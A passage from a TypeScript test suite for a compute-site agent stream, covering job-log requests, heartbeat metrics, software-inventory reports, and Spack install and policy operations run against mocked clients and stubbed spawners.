    await runPromise;

    const response = sent.find(
      (message) =>
        (message as { payload: { case: string; value?: { requestId?: string } } }).payload.case ===
          "jobLogsResponse" &&
        (message as { payload: { value: { requestId: string } } }).payload.value.requestId ===
          "missing-logs",
    ) as { payload: { value: { text: string; error: string; unavailable: boolean } } } | undefined;
    expect(response?.payload.value).toMatchObject({ text: "", error: "", unavailable: true });
  });

  test("refuses restricted no-egress log requests without reading the adapter", async () => {
    let called = false;
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "jobLogsRequest",
          value: create(JobLogsRequestSchema, {
            requestId: "restricted-logs",
            schedulerJobId: "scheduler-42",
            jobId: "restricted-1",
            restrictedNoEgress: true,
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs, 20);
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        getJobLogs: async () => {
          called = true;
          return "secret";
        },
      }),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(20);
    stream.stop();
    await runPromise;

    expect(called).toBe(false);
    const response = sent.find(
      (message) =>
        (message as { payload: { case: string; value?: { requestId?: string } } }).payload.case ===
          "jobLogsResponse" &&
        (message as { payload: { value: { requestId: string } } }).payload.value.requestId ===
          "restricted-logs",
    ) as { payload: { value: { text: string; error: string; unavailable: boolean } } } | undefined;
    expect(response?.payload.value.text).toBe("");
    expect(response?.payload.value.error.toLowerCase()).toContain("restricted");
    expect(response?.payload.value.unavailable).toBe(false);
  });

  test("heartbeat carries gpu / disk / scheduler-queue / installed-software fields", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs, 80);

    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 5, // fire heartbeat fast
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [
        { index: 0, model: "A100", memUsedMb: 1024, memTotalMb: 40960, utilPercent: 35 },
      ],
      readDiskUsedPercent: async () => 55,
      readSchedulerQueueDepth: async () => 7,
      installedSoftware: [
        {
          name: "gromacs",
          version: "2024.1",
          hash: "abc1234",
          spec: "gromacs@2024.1",
        },
      ],
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    // Wait long enough for the 5ms heartbeat timer to fire at least once.
    await new Promise<void>((r) => setTimeout(r, 50));
    stream.stop();
    await runPromise;

    const heartbeats = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "heartbeat",
    ) as Array<{
      payload: {
        value: {
          gpus: Array<{ model: string }>;
          diskUsedPercent: number;
          schedulerQueuedJobs: number;
          installedSoftware: Array<{ name: string }>;
        };
      };
    }>;
    expect(heartbeats.length).toBeGreaterThanOrEqual(1);
    const hb = heartbeats[0];
    expect(hb).toBeDefined();
    expect(hb?.payload.value.gpus).toBeDefined();
    expect(hb?.payload.value.gpus[0]?.model).toBe("A100");
    expect(hb?.payload.value.diskUsedPercent).toBeCloseTo(55, 1);
    expect(hb?.payload.value.schedulerQueuedJobs).toBe(7);
    expect(hb?.payload.value.installedSoftware[0]?.name).toBe("gromacs");
  });

  test.each([
    { name: "known empty inventory emits periodic empty reports", known: true },
    {
      name: "unknown inventory emits no empty report until the setter publishes it",
      known: false,
    },
  ])("$name", async ({ known }) => {
    const closeFirst = Promise.withResolvers<void>();
    const reconnect = makeReplayReconnectClient(
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true }),
        },
      }),
      closeFirst.promise,
    );
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      clientFactory: reconnect.clientFactory,
      adapter: makeAdapter(),
      agentId: "agent-installed-inventory",
      siteName: "test-site",
      heartbeatIntervalMs: 5,
      logger: silent,
      installedSoftware: known ? [] : undefined,
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const running = stream.start();
    try {
      const sent = reconnect.sentByConnection[0];
      if (!sent) throw new Error("first connection messages missing");
      await waitForCondition(() => queueInventoryHeartbeats(sent).length >= 3);
      if (!known) {
        expect(installedSoftwareReports(sent)).toEqual([]);
        stream.setInstalledSoftware([]);
      }
      await waitForCondition(() => installedSoftwareReports(sent).length >= 2);
      for (const report of installedSoftwareReports(sent)) {
        expect(report.agentId).toBe("agent-installed-inventory");
        expect(report.installed).toEqual([]);
        expect(report.reportedAt).toBeGreaterThan(0n);
      }
      for (const [index, message] of (sent as AgentMessage[]).entries()) {
        if (message.payload.case === "installedSoftwareReport") {
          expect((sent[index - 1] as AgentMessage | undefined)?.payload.case).toBe("heartbeat");
        }
      }
      expect(reconnect.connectionCount()).toBe(1);
    } finally {
      stream.stop();
      closeFirst.resolve();
      await running;
    }
  });

  test("retries known empty inventory on successive live heartbeats after reconnect", async () => {
    const closeFirst = Promise.withResolvers<void>();
    const reconnect = makeReplayReconnectClient(
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true }),
        },
      }),
      closeFirst.promise,
    );
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      client,
      clientFactory: reconnect.clientFactory,
      adapter: makeAdapter(),
      agentId: "agent-installed-reconnect",
      siteName: "test-site",
      heartbeatIntervalMs: 5,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      installedSoftware: [],
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);
    const running = stream.start();
    try {
      const firstSent = reconnect.sentByConnection[0];
      if (!firstSent) throw new Error("first connection messages missing");
      await waitForCondition(() => installedSoftwareReports(firstSent).length >= 2);
      closeFirst.resolve();
      await waitForCondition(() => reconnect.connectionCount() === 2);
      const secondSent = reconnect.sentByConnection[1];
      if (!secondSent) throw new Error("second connection messages missing");
      await waitForCondition(() => installedSoftwareReports(secondSent).length >= 2);
      const reportsBeforeRetry = installedSoftwareReports(secondSent).length;
      await waitForCondition(
        () => installedSoftwareReports(secondSent).length > reportsBeforeRetry,
      );
      for (const sent of [firstSent, secondSent]) {
        for (const [index, message] of (sent as AgentMessage[]).entries()) {
          if (message.payload.case !== "installedSoftwareReport") continue;
          expect(message.payload.value.agentId).toBe("agent-installed-reconnect");
          expect(message.payload.value.installed).toEqual([]);
          expect((sent[index - 1] as AgentMessage | undefined)?.payload.case).toBe("heartbeat");
        }
      }
      expect(reconnect.connectionCount()).toBe(2);
    } finally {
      stream.stop();
      closeFirst.resolve();
      await running;
    }
  });

  test("negotiates compute health and preserves the adapter observation timestamp on live heartbeats", async () => {
    const observedAtUnixMs = 1_725_000_000_123;
    let observations = 0;
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, {
              accepted: true,
              message: "ok",
              computeHealthV1Supported: true,
            }),
          },
        }),
      ],
      80,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectComputeHealth: async () => {
          observations += 1;
          return {
            state: "ready",
            observedAtUnixMs,
            nodeCount: 2,
            operationalNodeCount: 2,
          };
        },
      }),
      agentId: "agent-compute-health",
      siteName: "test-site",
      heartbeatIntervalMs: 5,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() =>
      sent.some(
        (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
      ),
    );
    stream.stop();
    await runPromise;

    const register = sent.find(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "register",
    ) as { payload: { value: { computeHealthV1: boolean } } } | undefined;
    const heartbeat = sent.find(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
    ) as
      | {
          payload: {
            value: {
              computeHealth?: {
                state: ComputeHealthState;
                observedAtUnixMs: bigint;
                nodeCount: number;
                operationalNodeCount: number;
              };
            };
          };
        }
      | undefined;

    expect(register?.payload.value.computeHealthV1).toBe(true);
    expect(observations).toBeGreaterThan(0);
    expect(heartbeat?.payload.value.computeHealth).toMatchObject({
      state: ComputeHealthState.READY,
      observedAtUnixMs: BigInt(observedAtUnixMs),
      nodeCount: 2,
      operationalNodeCount: 2,
      reason: "",
    });
  });

  test("does not inspect or attach compute health until the Server negotiates it", async () => {
    let observations = 0;
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, { accepted: true, message: "old Server" }),
          },
        }),
      ],
      80,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectComputeHealth: async () => {
          observations += 1;
          return {
            state: "ready",
            observedAtUnixMs: Date.now(),
            nodeCount: 1,
            operationalNodeCount: 1,
          };
        },
      }),
      agentId: "agent-old-server",
      siteName: "test-site",
      heartbeatIntervalMs: 5,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() =>
      sent.some(
        (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
      ),
    );
    stream.stop();
    await runPromise;

    const heartbeat = sent.find(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
    ) as { payload: { value: { computeHealth?: unknown } } } | undefined;
    expect(observations).toBe(0);
    expect(heartbeat?.payload.value.computeHealth).toBeUndefined();
  });

  test("negotiates queue inventory and preserves scheduler facts on live heartbeats", async () => {
    const observedAt = new Date("2026-08-19T04:00:00.000Z");
    let inspections = 0;
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, {
              accepted: true,
              message: "ok",
              queueInventoryV1Supported: true,
            }),
          },
        }),
      ],
      80,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectQueues: async () => {
          inspections += 1;
          return {
            status: "available",
            defaultQueueName: "batch",
            observedAt,
            queues: [
              {
                queueName: "batch",
                queueType: "partition",
                isDefault: true,
                state: "up",
                acceptsSubmissions: true,
                hasComputeTargets: true,
                observedAt,
              },
            ],
          };
        },
      }),
      agentId: "agent-queue-inventory",
      siteName: "test-site",
      heartbeatIntervalMs: 5,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() =>
      sent.some(
        (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
      ),
    );
    stream.stop();
    await runPromise;

    const register = sent.find(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "register",
    ) as { payload: { value: { queueInventoryV1: boolean } } } | undefined;
    const heartbeat = sent.find(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
    ) as
      | {
          payload: {
            value: {
              queueInventory?: {
                status: QueueInventoryStatus;
                defaultQueueName: string;
                observedAtUnixMs: bigint;
                queues: Array<{
                  queueType: SchedulerQueueType;
                  state: SchedulerQueueState;
                  hasComputeTargets?: boolean;
                }>;
              };
            };
          };
        }
      | undefined;

    expect(register?.payload.value.queueInventoryV1).toBe(true);
    expect(inspections).toBeGreaterThan(0);
    expect(heartbeat?.payload.value.queueInventory).toMatchObject({
      status: QueueInventoryStatus.AVAILABLE,
      defaultQueueName: "batch",
      observedAtUnixMs: BigInt(observedAt.getTime()),
      queues: [
        {
          queueType: SchedulerQueueType.PARTITION,
          state: SchedulerQueueState.UP,
          hasComputeTargets: true,
        },
      ],
    });
  });

  test("does not inspect queue inventory until the Server negotiates it", async () => {
    let inspections = 0;
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, { accepted: true, message: "old Server" }),
          },
        }),
      ],
      80,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectQueues: async () => {
          inspections += 1;
          return {
            status: "available",
            observedAt: new Date(),
            queues: [],
          };
        },
      }),
      agentId: "agent-old-server-queues",
      siteName: "test-site",
      heartbeatIntervalMs: 5,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() =>
      sent.some(
        (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
      ),
    );
    stream.stop();
    await runPromise;

    const heartbeat = sent.find(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
    ) as { payload: { value: { queueInventory?: unknown } } } | undefined;
    expect(inspections).toBe(0);
    expect(heartbeat?.payload.value.queueInventory).toBeUndefined();
  });

  test("never adds compute health to persisted heartbeat replay", async () => {
    const sqlite = new Database(":memory:");
    runSqliteMigrations(sqlite);
    const outboundQueue = new OutboundQueue(drizzle(sqlite, { schema }));
    await outboundQueue.enqueueHeartbeat({
      cpuUsagePercent: 10,
      memoryUsedMb: 512,
      memoryTotalMb: 1024,
      runningJobs: 0,
      queuedJobs: 0,
    });
    let observations = 0;
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, {
              accepted: true,
              message: "ok",
              computeHealthV1Supported: true,
            }),
          },
        }),
      ],
      40,
    );
    const stream = new AgentStream({
      client,
      adapter: makeAdapter({
        inspectComputeHealth: async () => {
          observations += 1;
          return {
            state: "ready",
            observedAtUnixMs: Date.now(),
            nodeCount: 1,
            operationalNodeCount: 1,
          };
        },
      }),
      agentId: "agent-replay-health",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      outboundQueue,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await waitForCondition(() =>
      sent.some(
        (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
      ),
    );
    stream.stop();
    await runPromise;

    const replay = sent.find(
      (message) => (message as { payload?: { case?: string } }).payload?.case === "heartbeat",
    ) as { payload: { value: { computeHealth?: unknown } } } | undefined;
    expect(observations).toBe(0);
    expect(replay?.payload.value.computeHealth).toBeUndefined();
    sqlite.close();
  });

  test("inbound SoftwarePolicyUpdate triggers SpackManager.applyPolicy and emits ack", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwarePolicyUpdate",
          value: create(SoftwarePolicyUpdateSchema, {
            policyVersion: "v42",
            allowList: ["gromacs@*"],
            denyList: [],
            lockEnabled: true,
            mirrors: [],
            preinstallList: [],
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);

    // Stub spack manager that succeeds
    const stubSpawner: Spawner = {
      async run(cmd) {
        if (cmd[0] === "spack" && cmd[1] === "--version") {
          return { exitCode: 0, stdout: "0.22.1", stderr: "" };
        }
        return { exitCode: 0, stdout: "", stderr: "" };
      },
    };
    const spackManager = await SpackManager.bootstrap({ spawner: stubSpawner });
    expect(spackManager.available).toBe(true);

    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(20);
    stream.stop();
    await runPromise;

    const acks = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "softwarePolicyAck",
    );
    expect(acks.length).toBeGreaterThanOrEqual(1);
    const firstAck = acks[0] as {
      payload: { value: { policyVersion: string; applied: boolean } };
    };
    expect(firstAck.payload.value.policyVersion).toBe("v42");
    expect(firstAck.payload.value.applied).toBe(true);

    // The SpackManager should have stored the policy
    expect(spackManager.currentPolicyVersion()).toBe("v42");
  });

  test.each([
    "absent",
    "standalone",
    "managed",
    "managed-disabled",
  ] as const)("advertises Spack material delivery only for a managed manager: %s", async (mode) => {
    const { client, sent } = makeMockClient([
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true }),
        },
      }),
    ]);
    const spackManager =
      mode === "absent"
        ? undefined
        : await SpackManager.bootstrap({
            enabled: mode !== "managed-disabled",
            requireServerMaterials: mode.startsWith("managed"),
            spawner: {
              async run() {
                return { exitCode: 0, stdout: "0.22.1", stderr: "" };
              },
            },
          });
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);
    const running = stream.start();
    await settle(30);
    stream.stop();
    await running;
    const register = (sent as AgentMessage[]).find((m) => m.payload.case === "register");
    expect(register?.payload.case).toBe("register");
    if (register?.payload.case === "register") {
      expect(register.payload.value.spackMaterialDeliveryV1).toBe(mode.startsWith("managed"));
    }
  });

  test.each([
    "missing",
    "expired",
    "prepared",
  ] as const)("managed SoftwareOperationRequest never spawns install when materials are %s", async (mode) => {
    const operationId = "00000000-0000-4000-8000-000000000001";
    const manifestDigest = `sha256:${"a".repeat(64)}`;
    const ticket = mode === "missing" ? "" : "test-ticket";
    const { client, sent } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, { accepted: true }),
          },
        }),
        create(ServerMessageSchema, {
          payload: {
            case: "softwareOperationRequest",
            value: create(SoftwareOperationRequestSchema, {
              operationId,
              action: SoftwareOperationAction.INSTALL,
              spec: "zlib@1.3.1",
              spackMaterialTicket: ticket,
              spackManifestDigest: manifestDigest,
            }),
          },
        }),
      ],
      100,
    );
    const requests: SpackMaterialPrepareInput[] = [];
    const calls: string[][] = [];
    const prepared: PreparedSpackMaterials = {
      manifestDigest,
      manifestPath: "/cache/manifest",
      manifestSize: 1,
      blobs: [],
      manifest: {
        version: 1,
        repository: "public/test",
        spec: "zlib@1.3.1",
        spackVersion: "0.22.1",
        target: "linux-x86_64",
        redistribution: "unrestricted",
        recipes: [],
        sources: [],
        lockfile: { digest: manifestDigest, size: 1 },
      },
    };
    const spackManager = await SpackManager.bootstrap({
      requireServerMaterials: true,
      spawner: {
        async run(command) {
          calls.push(command);
          if (command[1] !== "--version") throw new Error("Unexpected Spack execution");
          return { exitCode: 0, stdout: "0.22.1", stderr: "" };
        },
      },
      materialClient: {
        async prepare(input) {
          requests.push(input);
          if (mode === "expired") throw new Error("Spack material HTTP 401");
          return prepared;
        },
      },
    });
    const stream = new AgentStream({
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);
    const running = stream.start();
    await settle(30);
    stream.stop();
    await running;
    const results = (sent as AgentMessage[]).flatMap((message) =>
      message.payload.case === "softwareOperationResult" ? [message.payload.value] : [],
    );
    expect(results.some((result) => result.status === SoftwareOperationStatus.SUCCEEDED)).toBe(
      false,
    );
    const final = results.find((result) =>
      [SoftwareOperationStatus.REJECTED, SoftwareOperationStatus.FAILED].includes(result.status),
    );
    expect(final).toBeDefined();
    if (mode === "expired") {
      expect(final?.status).toBe(SoftwareOperationStatus.FAILED);
      expect(final?.stderr).toContain("401");
    } else if (mode === "prepared") {
      expect(final?.status).toBe(SoftwareOperationStatus.FAILED);
      expect(final?.stderr).toContain("Spack material preflight failed");
    } else {
      expect(final?.status).toBe(SoftwareOperationStatus.REJECTED);
      expect(final?.error).toContain("ticket");
    }
    expect(requests).toEqual(
      mode === "missing"
        ? []
        : [
            {
              operationId,
              ticket,
              manifestDigest,
              spec: "zlib@1.3.1",
              spackVersion: "0.22.1",
              signal: expect.any(AbortSignal),
            },
          ],
    );
    if (mode !== "missing") expect(requests[0]?.signal?.aborted).toBe(true);
    expect(calls).toEqual([["spack", "--version"]]);
  });

  test("inbound SoftwareOperationRequest runs Spack operation and emits result", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwareOperationRequest",
          value: create(SoftwareOperationRequestSchema, {
            operationId: "00000000-0000-0000-0000-000000000001",
            action: SoftwareOperationAction.INSTALL,
            spec: "gromacs@2024.1",
            requestedBy: "00000000-0000-0000-0000-000000000002",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);
    const stubSpawner: Spawner = {
      async run(cmd) {
        if (cmd[1] === "--version") return { exitCode: 0, stdout: "0.22.1", stderr: "" };
        if (cmd[1] === "install") return { exitCode: 0, stdout: "installed", stderr: "" };
        if (cmd[1] === "find") return { exitCode: 0, stdout: FIND_JSON, stderr: "" };
        return { exitCode: 1, stdout: "", stderr: `unexpected command: ${cmd.join(" ")}` };
      },
    };
    const spackManager = await SpackManager.bootstrap({ spawner: stubSpawner });
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(30);
    stream.stop();
    await runPromise;

    const results = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "softwareOperationResult",
    ) as Array<{
      payload: {
        value: {
          status: SoftwareOperationStatus;
          spec: string;
          exitCode: number;
          installed: Array<{ name: string }>;
        };
      };
    }>;
    expect(results.map((r) => r.payload.value.status)).toContain(SoftwareOperationStatus.RUNNING);
    expect(results.map((r) => r.payload.value.status)).toContain(SoftwareOperationStatus.SUCCEEDED);
    const final = results.find((r) => r.payload.value.status === SoftwareOperationStatus.SUCCEEDED);
    expect(final?.payload.value.spec).toBe("gromacs@2024.1");
    expect(final?.payload.value.exitCode).toBe(0);
    expect(final?.payload.value.installed[0]?.name).toBe("gromacs");
  });

  test("source audit stdout is retained on rejected installation without success or inventory", async () => {
    const report = JSON.stringify({ validation: "isolated-source-audit", passed: true });
    const { client, sent } = makeMockClient([
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwareOperationRequest",
          value: create(SoftwareOperationRequestSchema, {
            operationId: "00000000-0000-0000-0000-000000000019",
            action: SoftwareOperationAction.INSTALL,
            spec: "zlib@1.3.1",
          }),
        },
      }),
    ]);
    const spackManager = await SpackManager.bootstrap({
      requireServerMaterials: true,
      spawner: {
        async run() {
          return { exitCode: 0, stdout: "1.0.0", stderr: "" };
        },
      },
    });
    spackManager.runSoftwareOperation = async () => ({
      outcome: "rejected",
      reason: "managed offline Spack execution is not enabled yet",
      stdout: report,
    });
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);
    const running = stream.start();
    await settle(30);
    stream.stop();
    await running;
    const results = (sent as AgentMessage[]).flatMap((message) =>
      message.payload.case === "softwareOperationResult" ? [message.payload.value] : [],
    );
    expect(results.map((value) => value.status)).toEqual([
      SoftwareOperationStatus.RUNNING,
      SoftwareOperationStatus.REJECTED,
    ]);
    expect(results[1]?.stdout).toBe(report);
    expect(results[1]?.installed).toEqual([]);
  });

  test.each([
    { name: "does not turn unknown inventory into known empty", known: false, keepOther: false },
    {
      name: "publishes empty inventory after invalidating the last hash",
      known: true,
      keepOther: false,
    },
    {
      name: "preserves unrelated software without a clearing report",
      known: true,
      keepOther: true,
    },
  ])("failed managed verification $name", async ({ known, keepOther }) => {
    const closeFirst = Promise.withResolvers<void>();
    const reconnect = makeReplayReconnectClient(
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true }),
        },
      }),
      closeFirst.promise,
    );
    const { client } = makeMockClient([]);
    const spackManager = await SpackManager.bootstrap({
      requireServerMaterials: true,
      spawner: {
        async run() {
          return { exitCode: 0, stdout: "1.0.0", stderr: "" };
        },
      },
    });
    spackManager.runSoftwareOperation = async () => ({
      outcome: "failed",
      exitCode: 1,
      stderr: "verification failed",
      invalidatedHashes: ["invalid"],
    });
    const keep = { name: "existing", version: "1.0", hash: "keep", spec: "existing@1.0" };
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      clientFactory: reconnect.clientFactory,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 5,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
      installedSoftware: known
        ? [
            ...(keepOther ? [keep] : []),
            { name: "hello", version: "1.0", hash: "invalid", spec: "hello@1.0" },
          ]
        : undefined,
      readGpuMetrics: async () => [],
      readDiskUsedPercent: async () => 0,
      readSchedulerQueueDepth: async () => 0,
    });
    const snapshots: Array<Parameters<AgentStream["setInstalledSoftware"]>[0]> = [];
    const update = stream.setInstalledSoftware.bind(stream);
    stream.setInstalledSoftware = (specs) => {
      snapshots.push(specs);
      update(specs);
    };
    activeStreams.push(stream);
    const running = stream.start();
    try {
      const sent = reconnect.sentByConnection[0];
      if (!sent) throw new Error("first connection messages missing");
      await waitForCondition(() => queueInventoryHeartbeats(sent).length >= 2);
      expect(installedSoftwareReports(sent)).toEqual([]);
      await deliverServerMessage(
        stream,
        create(ServerMessageSchema, {
          payload: {
            case: "softwareOperationRequest",
            value: create(SoftwareOperationRequestSchema, {
              operationId: "00000000-0000-0000-0000-000000000020",
              action: SoftwareOperationAction.LOAD,
              spec: "hello@1.0",
            }),
          },
        }),
      );
      const results = () =>
        (sent as AgentMessage[]).flatMap((message) =>
          message.payload.case === "softwareOperationResult" ? [message.payload.value] : [],
        );
      await waitForCondition(() =>
        results().some((result) => result.status === SoftwareOperationStatus.FAILED),
      );
      const afterFailure = sent.length;
      await waitForCondition(() => queueInventoryHeartbeats(sent.slice(afterFailure)).length >= 3);
      expect(snapshots).toEqual(known ? [keepOther ? [keep] : []] : []);
      const heartbeats = (sent.slice(afterFailure) as AgentMessage[]).flatMap((message) =>
        message.payload.case === "heartbeat" ? [message.payload.value] : [],
      );
      expect(heartbeats.at(-1)?.installedSoftware.map((spec) => spec.hash)).toEqual(
        keepOther ? ["keep"] : [],
      );
      if (known && !keepOther) {
        await waitForCondition(() => installedSoftwareReports(sent).length >= 2);
        for (const report of installedSoftwareReports(sent)) {
          expect(report.agentId).toBe("agent-001");
          expect(report.installed).toEqual([]);
        }
      } else {
        expect(installedSoftwareReports(sent)).toEqual([]);
      }
      expect(results().map((value) => value.status)).toEqual([
        SoftwareOperationStatus.RUNNING,
        SoftwareOperationStatus.FAILED,
      ]);
      expect(reconnect.connectionCount()).toBe(1);
    } finally {
      stream.stop();
      closeFirst.resolve();
      await running;
    }
  });

  test("serializes software execution through inventory publication before later invalidation", async () => {
    const { client } = makeMockClient(
      [
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, { accepted: true }),
          },
        }),
        ...[SoftwareOperationAction.IMPORT_PREINSTALLED, SoftwareOperationAction.LOAD].map(
          (action, index) =>
            create(ServerMessageSchema, {
              payload: {
                case: "softwareOperationRequest",
                value: create(SoftwareOperationRequestSchema, {
                  operationId: `00000000-0000-0000-0000-00000000003${index}`,
                  action,
                  spec: "hello@1.0",
                }),
              },
            }),
        ),
      ],
      100,
    );
    const spackManager = await SpackManager.bootstrap({
      requireServerMaterials: true,
      spawner: {
        async run() {
          return { exitCode: 0, stdout: "1.0.0", stderr: "" };
        },
      },
    });
    const entered = Promise.withResolvers<void>();
    const release = Promise.withResolvers<void>();
    const finished = Promise.withResolvers<void>();
    const calls: string[] = [];
    const keep = { name: "existing", version: "1.0", hash: "keep", spec: "existing@1.0" };
    const installed = [keep, { name: "hello", version: "1.0", hash: "invalid", spec: "hello@1.0" }];
    spackManager.runSoftwareOperation = async (action) => {
      calls.push(action);
      if (action === "import_preinstalled") {
        entered.resolve();
        await release.promise;
        return { outcome: "succeeded", stdout: "", installed };
      }
      return {
        outcome: "failed",
        exitCode: 1,
        stderr: "verification failed",
        invalidatedHashes: ["invalid"],
      };
    };
